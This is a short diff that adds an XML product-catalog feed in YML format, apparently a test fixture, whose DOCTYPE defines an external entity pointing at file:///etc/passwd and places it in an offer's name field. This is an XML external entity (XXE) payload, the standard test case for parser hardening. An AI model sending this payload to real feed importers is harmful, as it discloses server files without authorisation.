@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE yml_catalog [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<yml_catalog><shop><offers><offer id="1"><name>&xxe;</name></offer></offers></shop></yml_catalog>
